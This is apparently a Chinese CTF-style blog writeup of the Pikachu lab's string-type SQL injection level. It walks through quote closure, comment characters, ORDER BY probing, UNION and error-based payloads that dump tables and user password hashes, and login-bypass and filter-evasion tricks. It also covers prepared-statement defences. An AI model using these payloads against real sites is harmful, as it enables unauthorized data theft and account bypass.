---
layout: post
title: Pikachu - SQL注入 字符型注入(get) Writeup（闭合与注释详解）
platform: pikachu
date: 2026-10-27 22:21:00 +0800
categories: CTF
---

Pikachu - SQL注入 字符型注入(get) Writeup（闭合与注释详解）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SQL-Inject → 字符型注入(get)
- 地址：`http://localhost/pikachu/vul/sqli/sqli_str.php`
- 题型：Web
- 考点：**字符型 SQL 注入**、引号闭合、注释符、UNION 联合查询

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
数据库：pikachu / root / root
```

**页面形态**：

```text
what's your username?

[ 文本框            ]  [ 查询 ]

your uid:1
your email is: vince@pikachu.com
```

**作者提示**：

```html
data-content="变量类型为字符型"
```

**✅ 实测结果（10 种 payload）**

| # | payload | 结果 |
|---|---|---|
| 1 | `vince` | 1 条：uid=1 |
| 2 | `xxx` | 不存在 |
| 3 | **`vince' or '1'='1`** | **7 条（全部用户）** ✅ |
| 4 | **`vince' or 1=1 #`** | **7 条** ✅ |
| 5 | **`vince' or 1=1 -- `** | **7 条** ✅ |
| 6 | `vince'`（不闭合） | **SQL 报错** |
| 7 | `vince' order by 1 #` | 正常 |
| 8 | `vince' order by 2 #` | 正常 |
| 9 | **`vince' order by 3 #`** | **报错 → 只有 2 列** |
| 10 | **`-1' union select group_concat(concat(username,':',password) separator ' \| '),2 from users #`** | **admin:e10adc39... \| pikachu:670b1472... \| test:e99a18c4...** |

二、题目分析

**① 后端代码（和上一关只差两个单引号）**

```php
<?php
// sqli_str.php 第 24-29 行
if(isset($_GET['submit']) && $_GET['name'] != null){
    //这里没有做任何处理，直接拼到select里面去了
    $name = $_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query = "select id,email from member where username='$name'";    // ★ 单引号包裹
    $result = execute($link, $query);
```

**★ 对比上一关（数字型）**：

```sql
-- 数字型
where id=$id                      ← 没有引号，直接塞条件

-- 字符型（本关）
where username='$name'            ← ★ 单引号包裹，必须先"逃出"字符串
```

**★ 作者在注释里都写明了**：

```
第 25 行："这里没有做任何处理，直接拼到select里面去了"
第 27 行："这里的变量是字符型，需要考虑闭合"
```

**② 核心：什么叫"闭合"**

**拼接后的完整 SQL**：

```sql
select id,email from member where username='【你输入的内容】'
                                            ↑                ↑
                                        SQL 自带的左引号   SQL 自带的右引号
```

**输入正常值 `vince`**：

```sql
select id,email from member where username='vince'
```

**★ 一切正常。**

**输入 `vince'`（只有一个引号，不带其他）**：

```sql
select id,email from member where username='vince''
                                                        ↑↑
                                          多了一个引号 → 语法错误
```

**★ 实测：页面显示 "SQL-Inject"（报错页）**

**★ 所以"闭合"的意思是**：

```
你输入的单引号 → 提前结束 SQL 自带的字符串
但 SQL 末尾还有一个 ' 等着被配对
→ 你必须再补一个 ' （或者用注释把它干掉）
```

**③ 两种策略：补引号 vs 注释掉**

**策略 A：补引号（引号配平）**

```sql
payload: vince' or '1'='1
```

**拼接结果**：

```sql
select id,email from member where username='vince' or '1'='1'
                                            └──┬──┘└──┬──┘└┬┘
                                        闭合第1个  补的引号  SQL自带的'被吃
```

**★ 拆解**：

```
① vince'     → 闭合第一个 '
② or         → 加条件
③ '1'='1     → 一个恒真的字符串比较
               ★ 这里的最后一个 ' 正好和 SQL 末尾那个 ' 配对
```

**★ 优点**：不依赖注释符，最稳。

**★ 缺点**：payload 看起来更绕，初学者不容易理解。

**策略 B：注释掉尾巴**

```sql
payload: vince' or 1=1 #
```

**拼接结果**：

```sql
select id,email from member where username='vince' or 1=1 #'
                                                          └┬┘
                                                     # 把后面全注释掉
```

**★ 优点**：payload 更短更直观（`or 1=1` 比 `or '1'='1` 好理解）。

**★ 缺点**：依赖注释符，且不同数据库的注释符不同。

**★ 两种策略的对比**：

| | 补引号 `'1'='1` | 注释 `#` |
|---|---|---|
| payload | `vince' or '1'='1` | `vince' or 1=1 #` |
| 依赖注释符 | ❌ | ✅ |
| 可读性 | 稍绕 | 直观 |
| 稳定性 | ✅ 高 | ⚠️ 要注意注释符格式 |

**④ 三种注释符（MySQL）**

**注释符 1：`#`**

```sql
vince' or 1=1 #
```

**★ 最大的坑：URL 里的 `#` 是"锚点"符号！**

```
浏览器地址栏直接打 # → 浏览器把它当锚点，不会发给服务器
    ?name=vince' or 1=1 #        ← 服务器收到的只有 "vince' or 1=1 "
    
正确写法：必须编码成 %23
    ?name=vince' or 1=1 %23      ← 服务器收到 "vince' or 1=1 #"
```

**★ 但从【表单输入框】提交时，浏览器会自动编码 `#` → `%23`，所以没问题。**

**注释符 2：`-- `（两个减号 + 一个空格）**

```sql
vince' or 1=1 -- 
```

**★ 注意 `--` 后面**必须有一个空白字符**（空格 / Tab / 换行）**：

```
-- 后面跟空格    ✅ 有效
-- 后面直接跟字符 ❌ 无效（MySQL 要求 -- 后跟空白）
```

**★ 复制 payload 时最容易丢掉那个空格 —— 这是新手最常踩的坑。**

**注释符 3：`/**/`（块注释）**

```sql
vince' or 1=1 /**/
```

**★ `/**/` 还有一个额外用途：代替空格**：

```sql
-1'/**/union/**/select/**/1,2/**/#
```

**★ 当 WAF 过滤空格时，用 `/**/` 或 `%09`（Tab）、`%0a`（换行）代替。**

**⑤ 为什么这一关比上一关简单**

| | 数字型(post) | **字符型(get)** |
|---|---|---|
| 输入方式 | **下拉框**（只有 1~5）| **文本框**（随便输）|
| 需要改包吗 | ✅ 要（改 DOM / 重发）| ❌ **不用** |
| 提交方式 | POST | **GET（payload 直接在 URL 里）** |
| 额外步骤 | 无 | **多一个"闭合引号"** |

**★ 所以这一关的核心新增知识点就是"闭合"，其他都一样。**

**⑥ "不存在" 和 "SQL 报错" 的区别（判断依据）**

**实测三种响应**：

| 输入 | 页面显示 | 含义 |
|---|---|---|
| `vince` | `your uid:1 ... vince@...` | 查询成功 |
| `xxx` | `您输入的username不存在，请重新输入！` | 查询成功但没结果 |
| `vince'` | `SQL-Inject`（报错页）| **SQL 语法错误** |

**★ 这个区分很重要**：

```
"不存在"   → SQL 执行成功了，只是没匹配到数据
"SQL 报错" → SQL 语法错误 → ★ 这是注入存在的强信号

★ 看到报错 = 你的 payload 破坏了 SQL 结构
★ 接下来只需要"让它变成合法 SQL"
```

三、解题步骤

**第 1 步：正常查询（建立基准）**

```text
① 打开 http://localhost/pikachu/vul/sqli/sqli_str.php
② 输入框填：vince
③ 点查询
④ 看到：
     your uid:1
     your email is: vince@pikachu.com
```

**第 2 步：试探引号（判断字符型）**

**输入**：

```
vince'
```

**结果**：页面显示 **`SQL-Inject`**（报错）

**★ 这个报错本身就是好消息**：

```
说明：' 破坏了 SQL 的引号配对
→ SQL 被拼接 → 有注入
```

**★ 如果是"不存在"而不是报错，说明引号被转义了（没注入）。**

**第 3 步：⭐ 闭合引号注入（策略 A）**

**输入**：

```
vince' or '1'='1
```

**结果**：7 个用户全部返回 ✅

**★ 为什么能成**：

```sql
select id,email from member where username='vince' or '1'='1'
```

```
① 'vince'  → 正常的字符串比较（假，vince 不是 'vince' or ...）

等等，实际上是这样的：

where username='vince' or '1'='1'
                    └──┬──┘└──┬──┘
                 第一条件   恒真条件
                 
OR 的关系：只要有一个为真 → 整行通过
'1'='1' 永远为真 → 所有行都通过
```

**第 4 步：⭐ 闭合 + 注释（策略 B）**

**输入**：

```
vince' or 1=1 #
```

**★ 如果 `#` 没生效**（从地址栏手输时常见），改用：

```
vince' or 1=1 -- 
```

**★ 注意 `--` 后面有空格。**

**结果**：7 个用户 ✅

**第 5 步：探列数（order by 法）**

**payload**：

```
vince' order by 1 #
vince' order by 2 #
vince' order by 3 #
```

**实测结果**：

```
order by 1  → 正常
order by 2  → 正常
order by 3  → SQL 报错
```

**★ 结论：查询只有 2 列。**

**★ `order by` 探列数的原理**：

```sql
select id,email from member where username='vince' order by 2
                                                            ↑
                                                  按第 2 列排序 → 合法

select ... order by 3
                    ↑
          没有第 3 列 → 报错 "Unknown column '3' in 'order clause'"
```

**★ 这个方法比 union 更简单**：

```
union 要求你"构造完整的多列 SELECT"
order by 只需要递增一个数字
```

**第 6 步：UNION 注入（探回显位）**

**payload**：

```
-1' union select 1,2 #
```

**结果**：

```
your uid:1
your email is: 2
```

**★ 说明**：

```
① 原查询是 2 列（id, email）
② union 后面也写 2 列 → 不报错
③ 页面显示 1 和 2 → 第 1 列和第 2 列都能回显
```

**★ 为什么用 `-1` 而不是 `1`？**

```sql
-- 用 1：
where username='1' union select 1,2
→ username='1' 查不到（没有名叫 "1" 的用户）
→ 其实也行，但不确定

-- 用 -1：
where username='-1' union select 1,2
→ 一定查不到 → 只显示 union 的结果
```

**★ 更常见的写法是 `-1` 或 `0` 或 `1=2`**：

```sql
-1' union select 1,2 #
0' union select 1,2 #
1' and 1=2 union select 1,2 #
```

**第 7 步：读库名、用户**

**payload**：

```
-1' union select database(),user() #
```

**结果**：

```
your uid:pikachu
your email is: root@localhost
```

**第 8 步：读表名**

**payload**：

```
-1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
```

**结果**：

```
your uid:httpinfo,member,message,users,xssblind
your email is: 2
```

**★ 5 张表全拿到了。**

**第 9 步：拖 users 表的账号密码**

**payload**：

```
-1' union select group_concat(concat(username,':',password) separator ' | '),2 from users #
```

**结果**：

```
your uid:admin:e10adc3949ba59abbe56e057f20f883e |
         pikachu:670b14728ad9902aecba32e22fa4f6bd |
         test:e99a18c428cb38d5f260853678922e03
your email is: 2
```

**★ 三个账号 + MD5 哈希全到手。**

**★ 哈希破解（上一关做过）**：

```text
admin   : e10adc3949ba59abbe56e057f20f883e → 123456
pikachu : 670b14728ad9902aecba32e22fa4f6bd → 000000
test    : e99a18c428cb38d5f260853678922e03 → abc123
```

**第 10 步：完整 payload 汇总表**

```sql
-- ① 判断注入
vince'

-- ② 闭合注入（补引号法）
vince' or '1'='1

-- ③ 闭合注入（注释法）
vince' or 1=1 #

-- ④ 探列数
vince' order by 3 #

-- ⑤ union 探回显
-1' union select 1,2 #

-- ⑥ 基本信息
-1' union select database(),user() #
-1' union select version(),@@version_compile_os #

-- ⑦ 表名
-1' union select group_concat(table_name),2
   from information_schema.tables where table_schema=database() #

-- ⑧ 列名
-1' union select group_concat(column_name),2
   from information_schema.columns where table_name='users' #

-- ⑨ 拖数据
-1' union select group_concat(concat(username,':',password)),2 from users #
```

四、延伸知识

**① 字符型注入的完整方法论**

```text
第 1 步：判断注入是否存在
    输入 '        → SQL 报错 = 有注入
    输入 ' and 1=1 → 正常
    输入 ' and 1=2 → 无结果
    ★ 两者不同 = 注入成立

第 2 步：判断注释符
    ' #          → 试 #
    ' --         → 试 --（带空格）
    ' /*         → 试 /**/

第 3 步：探列数
    ' order by N #     （N 递增到报错）
    或
    ' union select 1,2,3... #   （直到不报错）

第 4 步：找回显位
    -1' union select 1,2,3 #

第 5 步：读元数据
    information_schema.tables / columns

第 6 步：拖数据
```

**② 闭合的四种常见形态**

**形态 1：单引号字符串**

```php
$query = "select ... where name='$x'";
```
```sql
payload: ' or 1=1 #
```

**形态 2：双引号字符串**

```php
$query = 'select ... where name="$x"';
```
```sql
payload: " or 1=1 #
```

**形态 3：括号 + 引号**

```php
$query = "select ... where name=('$x')";
```
```sql
payload: ') or 1=1 #
                ↑ 要先闭合 ) 再注释
```

**形态 4：LIKE 模糊查询**

```php
$query = "select ... where name like '%$x%'";
```
```sql
payload: %' or 1=1 #
★ 注意前后都有 %
```

**★ 判定的方法：看报错信息 / 看源码 / 试探**。

**③ 报错注入（union 不方便时用）**

**有些场景 union 用不了**（比如只显示"对/错"、没有回显位），这时用**报错注入**：

```sql
-1' and extractvalue(1, concat(0x7e, database())) #
```

**★ 原理**：

```
extractvalue() 是 XML 函数
当第 2 个参数不是合法的 XPath 时 → 报错
报错信息里会带上参数内容
→ 数据就"从报错信息里泄露出来"
```

**★ 输出**：

```
XPATH syntax error: '~pikachu'
                        └──┬──┘
                     数据库名
```

**其他报错函数**：

```sql
extractvalue(1, concat(0x7e, (select database())))
updatexml(1, concat(0x7e, (select database())), 1)
floor(rand(0)*2)   + group by  （经典的双查询报错）
```

**★ 报错注入的限制**：

```
报错信息通常有长度限制（约 32 字符）
→ 要用 substr() 分段读取
```

**④ 字符型注入的防御**

**❌ 错误做法 1：只用 `addslashes`**

```php
$name = addslashes($_GET['name']);
$query = "select ... where username='$name'";
```

**★ `addslashes` 把 `'` 转成 `\'` → 闭合失败 → 有效。**

**★ 但有个大坑**：**宽字节注入**（下一关会讲）。

```
GBK 编码下，%df%27  →  addslashes 后变成 %df%5c%27
                     →  %df%5c 在 GBK 里是一个汉字（運）
                     →  %27 又变回裸的单引号
                     → 闭合成功！
```

**❌ 错误做法 2：`str_replace` 替换关键字**

```php
$name = str_replace(['union', 'select', 'or'], '', $_GET['name']);
// 绕过：ununionion se select lect ...
```

**✅ 正确做法：预处理语句**

```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);              // 's' = string
$stmt->execute();
$result = $stmt->get_result();
```

**★ 预处理的原理**：

```
SQL 结构先发给数据库 → 数据库解析并编译
参数值后发 → 只作为"数据"绑定，不再解析

★ 所以 ' or 1=1 # 会被当成"一个叫 `' or 1=1 #` 的用户名"
★ 查不到 → 返回空
★ 注入从根本上不可能
```

**★ 这是防 SQL 注入的"银弹"，字符型和数字型都适用。**

**⑤ 预处理 vs 转义的完整对比**

| 方案 | 数字型 | 字符型 | 宽字节 | 推荐度 |
|---|---|---|---|---|
| **预处理（prepare/bind）** | ✅ | ✅ | ✅ | ✅✅✅ |
| `intval()` | ✅ | ❌ | ❌ | ✅（数字专用）|
| `mysqli_real_escape_string` | ❌ 无效 | ✅ | ❌ **被绕过** | ⚠️ 不推荐 |
| `addslashes` | ❌ | ✅ | ❌ **被绕过** | ❌ 不推荐 |
| 关键字黑名单 | ❌ | ⚠️ | ⚠️ | ❌ 不推荐 |

**★ 结论**：

```
唯一推荐：预处理语句
其他方案都有各自的绕过手法
```

**⑥ 真实世界的字符型注入案例**

**案例 1：登录框万能密码**

```php
$query = "select * from users where username='$u' and password='$p'";
```

**payload**：

```
用户名：admin' #
密码：  随便

→ select * from users where username='admin' #' and password='...'
→ 密码条件被注释掉 → 直接登录成功
```

**★ 这就是"万能密码"的原理 —— 本质上就是字符型注入。**

**案例 2：搜索功能**

```php
$query = "select * from goods where name like '%$k%'";
```

**payload**：

```
%' union select ... #
```

**案例 3：订单查询**

```php
$query = "select * from orders where order_no='$no'";
```

**★ 这类"按编号查询"的功能是注入重灾区。**

**⑦ 一个实用的调试技巧：让 SQL 报错显示出来**

**做题时如果页面不显示报错，很难判断**：

```php
// 开发环境打开错误显示
ini_set('display_errors', 1);
error_reporting(E_ALL);
```

**★ 或者用 `and 1=1` / `and 1=2` 对比**：

```sql
vince' and 1=1 #     → 正常返回（有结果）
vince' and 1=2 #     → 无结果
★ 两者的差异证明注入有效（盲注的基础）
```

**★ 如果连"有无结果"都看不出来**：

```
→ 进入"盲注"领域（后面两关会讲）
→ 用布尔盲注（页面状态差异）或时间盲注（sleep）
```

五、总结

- **本题核心：`$_GET['name']` 被拼进 `where username='$name'`（字符型）→ 必须先闭合单引号才能注入。**

- **一行漏洞代码**：

```php
$query = "select id,email from member where username='$name'";
```

- **⭐ 五个必记要点**：

```text
① 字符型必须先"闭合"
   where username='$name'
   → 你的 ' 提前结束字符串
   → 末尾还有一个 ' 要处理（补引号 或 注释掉）

② 两种策略
   补引号：vince' or '1'='1
   注释：  vince' or 1=1 #

③ 三种注释符（MySQL）
   #        → URL 里要编码成 %23
   -- 空格   → -- 后必须有空格（最容易丢）
   /**/     → 还可代替空格

④ order by 探列数最简单
   vince' order by 3 #  → 报错 → 只有 2 列

⑤ 报错 ≠ 失败
   "不存在"   = SQL 成功但没结果
   "SQL 报错" = 注入存在的强信号
```

- **实测数据**：

```text
vince                          → uid=1（正常）
xxx                            → 不存在
vince'                         → SQL 报错（证明有注入）
vince' or '1'='1               → 7 条（全部用户）
vince' or 1=1 #                → 7 条
vince' or 1=1 --               → 7 条

vince' order by 1 #            → 正常
vince' order by 2 #            → 正常
vince' order by 3 #            → 报错 → 2 列

-1' union select 1,2 #         → 1 | 2
-1' union select database(),user() # → pikachu | root@localhost
-1' union select group_concat(table_name),2
   from information_schema.tables where table_schema=database() #
   → httpinfo,member,message,users,xssblind

-1' union select group_concat(concat(username,':',password) separator ' | '),2 from users #
   → admin:e10adc3949ba59abbe56e057f20f883e
   | pikachu:670b14728ad9902aecba32e22fa4f6bd
   | test:e99a18c428cb38d5f260853678922e03
```

- **SQL-Inject 模块进度**：

```text
✅ 数字型注入(post)      —— 无引号，直接塞条件
✅ 字符型注入(get)       —— 本题：闭合单引号
⬜ 搜索型注入            —— like '%$x%'
⬜ xx型注入              —— ('$x') 括号包裹
⬜ "insert/update"注入   —— 写操作注入
⬜ "delete"注入          —— 删除操作注入
⬜ "http header"注入     —— User-Agent / Referer
⬜ 盲注(base on boolean) —— 只有真假两种状态
⬜ 盲注(base on time)    —— 用 sleep 判断
⬜ 宽字节注入            —— GBK 编码绕过 addslashes
```

**手工复现要点**：

```text
· 打开 sqli_str.php，输入 vince → 看 uid=1
· 输入 vince' → 看 SQL 报错（证明有注入）
· 输入 vince' or '1'='1 → 7 个用户
· 输入 vince' or 1=1 # → 7 个用户（注意 URL 手输时 # 要编码）
· 输入 vince' order by 3 # → 报错，说明 2 列
· 输入 -1' union select 1,2 # → 探回显位
· 输入 -1' union select database(),user() # → pikachu / root
· 用 information_schema 读表名、列名、数据
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  字符型注入 = 数字型 + "先逃出字符串"                          │
│                                                            │
│  两步：                                                     │
│     ① 闭合： 用 ' 结束 SQL 自带的字符串                       │
│     ② 收尾： 补一个 ' 或用 # / -- / /**/ 注释掉               │
│                                                            │
│  之后的一切（order by / union / information_schema）          │
│  和数字型完全一样                                            │
│                                                            │
│  ★ "SQL 报错" 是注入存在的强信号，不是失败                      │
│  ★ 唯一可靠防御：预处理语句（prepare + bind_param）             │
└────────────────────────────────────────────────────────────┘
```
